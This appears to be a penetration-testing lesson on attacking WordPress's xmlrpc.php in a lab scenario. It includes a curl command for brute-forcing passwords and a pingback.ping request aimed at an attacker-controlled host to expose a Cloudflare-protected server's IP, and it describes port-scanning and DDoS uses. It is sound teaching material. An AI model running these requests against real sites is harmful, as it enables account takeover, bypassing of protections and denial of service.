# Attacking WordPress 'xmlrpc.php'
It is important to note that `xmlrpc.php` being enabled on a WordPress instance is not a vulnerability. Depending on the methods allowed, `xmlrpc.php` can facilitate some enumeration and exploitation activities, though.
## Scenario Example
Suppose we are assessing the security of a WordPress instance residing in http://blog.inlanefreight.com. 

Through enumeration activities, we identified a valid username, `admin`, and that `xmlrpc.php` is enabled. 

Identifying if `xmlrpc.php` is enabled is as easy as requesting `xmlrpc.php` on the domain we are assessing.

We can mount a password brute-forcing attack through `xmlrpc.php`, as follows:
```shell
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
```
- We will receive a `403 faultCode` error if the credentials are not valid.

Here we can see a successful login attempt through `xmlrpc.php`.

You may ask how we identified the correct method to call (_system.listMethods_). We did that by going through the well-documented [Wordpress code](https://codex.wordpress.org/XML-RPC/system.listMethods) and interacting with `xmlrpc.php`, as follows:
```shell
curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
```
- Inside the list of available methods above, [pingback.ping](https://codex.wordpress.org/XML-RPC_Pingback_API) is included. 
- `pingback.ping` allows for XML-RPC pingbacks. According to WordPress, a [pingback](https://wordpress.com/support/comments/pingbacks/) is a special type of comment that’s created when you link to another blog post, as long as the other blog is set to accept pingbacks.

If pingbacks are available, they can facilitate:
- **IP Disclosure -** An attacker can call the `pingback.ping` method on a WordPress instance behind Cloudflare to identify its public IP. The pingback should point to an attacker-controlled host (such as a VPS) accessible by the WordPress instance.
- **Cross-Site Port Attack (XSPA) -** An attacker can call the `pingback.ping` method on a WordPress instance against itself (or other internal hosts) on different ports. Open ports or internal hosts can be identified by looking for response time differences or response differences.
- **Distributed Denial of Service Attack (DDoS) -** An attacker can call the `pingback.ping` method on numerous WordPress instances against a single target.

An IP Disclosure attack could be mounted if `xmlrpc.php` is enabled and the `pingback.ping` method is available.
- XSPA and DDoS attacks can be mounted similarly.

Suppose that the WordPress instance residing in http://blog.inlanefreight.com is protected by Cloudflare. As we already identified, it also has `xmlrpc.php` enabled, and the `pingback.ping` method is available.

As soon as the below request is sent, the attacker-controlled host will receive a request (pingback) originating from http://blog.inlanefreight.com, verifying the pingback and exposing http://blog.inlanefreight.com 's public IP address.
```http
--> POST /xmlrpc.php HTTP/1.1 
Host: blog.inlanefreight.com 
Connection: keep-alive 
Content-Length: 293

<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>http://attacker-controlled-host.com/</string></value>
</param>
<param>
<value><string>https://blog.inlanefreight.com/2015/10/what-is-cybersecurity/</string></value>
</param>
</params>
</methodCall>
```